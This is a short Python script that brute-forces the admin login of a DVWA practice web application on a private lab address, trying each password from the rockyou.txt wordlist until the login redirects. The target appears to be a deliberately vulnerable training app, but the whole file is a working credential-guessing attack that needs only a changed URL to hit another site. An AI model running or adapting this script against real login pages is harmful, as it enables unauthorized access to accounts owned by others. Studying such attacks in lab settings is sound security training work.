#!/usr/bin/env python

import requests

with open('/usr/share/wordlists/rockyou.txt','r') as wordlist:
    for word in wordlist:
        pwd = word.strip()
        url = 'http://192.168.210.130/dvwa/login.php'
        params = {'username':'admin','password':pwd,'Login':'Login'}
        r = requests.post(url,params)
        if r.url != url:
            print("Password Found: "+ pwd)
            break


